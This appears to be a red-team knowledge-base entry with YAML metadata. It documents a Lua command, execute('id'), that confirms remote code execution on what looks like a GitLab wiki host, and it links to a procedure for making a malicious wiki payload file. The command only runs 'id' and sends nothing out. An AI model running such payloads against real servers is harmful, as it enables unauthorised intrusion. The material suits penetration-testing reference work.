---
id: cmd-execute-id
data: execute('id')
tags:
  - rce
  - lua
type: command
output: 'Output of ''id'' command, e.g., uid=xxx(gitlab-www) gid=xxx(gitlab-www)'
executor: lua
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.118Z'
verified: false
validated: true
submitted: true
---
# execute-id

## Command

```lua
execute('id')
```

## Description

Executes the 'id' system command via the Lua payload's io.popen function to display current user and group information, demonstrating RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'id'` | Shell command to run | Yes |

## Examples

### Basic Usage

```lua
print(execute('id'))
```

### Advanced Usage

```lua
local result = execute('id -u'); print(result)
```

## Expected Output

'uid=33(gitlab-www) gid=33(gitlab-www) groups=33(gitlab-www)' printed on wiki page.

## Related

- [[commands/execute-echo-file]]
- [[procedures/Create-Malicious-Wiki-Payload-File]]
